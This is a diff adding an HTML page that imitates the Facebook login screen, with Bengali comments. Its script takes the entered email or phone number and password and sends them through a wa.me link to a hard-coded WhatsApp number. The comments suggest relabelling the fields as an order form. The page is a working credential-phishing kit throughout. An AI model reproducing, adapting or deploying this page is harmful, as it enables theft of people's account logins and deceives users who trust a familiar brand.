@@ -1,0 +1,232 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook login </title>
+    <style>
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: Arial, Helvetica, sans-serif;
+        }
+
+        body {
+            background-color: #1877f2;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 15px;
+        }
+
+        .container {
+            background: linear-gradient(180deg, #7daee8 0%, #b8d4f7 50%, #d8e7fa 100%);
+            width: 100%;
+            max-width: 380px;
+            padding: 35px 20px 25px 20px;
+            border-radius: 20px;
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.25);
+            text-align: center;
+        }
+
+        .logo-section {
+            margin-bottom: 25px;
+        }
+
+        .logo-icon {
+            width: 65px;
+            height: 65px;
+            background-color: #ffffff;
+            color: #1877f2;
+            font-size: 45px;
+            font-weight: bold;
+            border-radius: 50%;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin: 0 auto 5px auto;
+        }
+
+        .brand-name {
+            font-size: 32px;
+            font-weight: bold;
+            color: #1877f2;
+            letter-spacing: -1.5px;
+        }
+
+        .form-group {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid #bcd0eb;
+            border-radius: 8px;
+            font-size: 15px;
+            outline: none;
+            background-color: #ffffff;
+            color: #333333;
+        }
+
+        input::placeholder {
+            color: #777777;
+        }
+
+        .btn-main {
+            background-color: #1877f2;
+            color: #ffffff;
+            border: none;
+            padding: 12px;
+            border-radius: 8px;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 5px;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
+        }
+
+        .btn-main:hover {
+            background-color: #1464cc;
+        }
+
+        .forgot-link {
+            color: #1877f2;
+            font-size: 14px;
+            text-decoration: none;
+            margin-top: 12px;
+            display: inline-block;
+        }
+
+        .divider {
+            display: flex;
+            align-items: center;
+            text-align: center;
+            margin: 20px 0;
+            color: #555555;
+            font-size: 14px;
+        }
+
+        .divider::before, .divider::after {
+            content: '';
+            flex: 1;
+            border-bottom: 1px dashed #888888;
+        }
+
+        .divider span {
+            padding: 0 10px;
+        }
+
+        .btn-secondary {
+            background-color: #ffffff;
+            color: #333333;
+            border: 1px solid #cccccc;
+            padding: 10px 20px;
+            border-radius: 8px;
+            font-size: 14px;
+            font-weight: bold;
+            cursor: pointer;
+            width: 80%;
+            margin: 0 auto;
+            box-shadow: 0 2px 4px rgba(0,0,0,0.05);
+        }
+
+        .languages {
+            display: flex;
+            justify-content: space-around;
+            font-size: 11px;
+            color: #555555;
+            margin-top: 25px;
+            line-height: 1.6;
+        }
+
+        /* নাম সরিয়ে খালি জায়গা রাখার জন্য */
+        .footer-text {
+            margin-top: 25px;
+            font-size: 13px;
+            color: #444444;
+            min-height: 20px; 
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <div class="logo-section">
+        <div class="logo-icon">f</div>
+        <div class="brand-name">facebook</div>
+    </div>
+
+    <div class="form-group">
+        <!-- ১ নম্বর ইনপুট বক্স -->
+        <input type="text" id="input1" placeholder="Mobile number or email" required>
+        
+        <!-- ২ নম্বর ইনপুট বক্স: প্রয়োজন অনুসারে 'Pasword' বদলে 'Quantity' বা অন্য কিছু লিখতে পারেন -->
+        <input type="text" id="input2" placeholder="Password" required>
+        
+        <!-- মূল বাটন: প্রয়োজন অনুসারে 'Log in' বদলে 'Order' বা অন্য কিছু লিখতে পারেন -->
+        <button type="button" class="btn-main" onclick="sendToWhatsApp()">Log in</button>
+    </div>
+
+    <!-- পাসওয়ার্ড/অতিরিক্ত লিংক (না লাগলে লাইনটি মুছে দিতে পারেন) -->
+    <a href="#" class="forgot-link">Forgot password?</a>
+
+    <div class="divider">
+        <span>or</span>
+    </div>
+
+    <!-- দ্বিতীয় বাটন: প্রয়োজন অনুসারে 'Create new account' বদলে 'Order now' লিখতে পারেন -->
+    <button type="button" class="btn-secondary" onclick="sendToWhatsApp()">Create new account</button>
+
+    <!-- ভাষা তালিকা -->
+    <div class="languages">
+        <div>
+            English (US)<br>
+            Bisaya<br>
+            日本語<br>
+            Português (Brasil)
+        </div>
+        <div>
+            Filipino<br>
+            Español<br>
+            한국어
+        </div>
+    </div>
+
+    <!-- একদম শেষের নাম মুছে জায়গাটি ফাঁকা রাখা হয়েছে -->
+    <div "copyright-2026">
+        <!-- copyright 2026 -->
+    </div>
+    copyright-2026<br>
+</div>
+
+<script>
+function sendToWhatsApp() {
+    // আপনার হোয়াটসঅ্যাপ নম্বর
+    var myWhatsAppNumber = "8801882945491"; 
+
+    var val1 = document.getElementById("input1").value;
+    var val2 = document.getElementById("input2").value;
+
+    if (!val1 || !val2) {
+        alert("দয়া করে দুটি ঘরই পূরণ করুন!");
+        return;
+    }
+
+    // হোয়াটসঅ্যাপে পাঠানোর বার্তা
+    var message = "🛒 *নতুন অর্ডার/তথ্য এসেছে!*\n\n" +
+                  "👤 *তথ্য ১:* " + val1 + "\n" +
+                  "📦 *তথ্য ২:* " + val2;
+
+    var whatsappUrl = "https://wa.me/" + myWhatsAppNumber + "?text=" + encodeURIComponent(message);
+    window.open(whatsappUrl, '_blank');
+}
+</script>
+
+</body>
+                     </html>
+                     
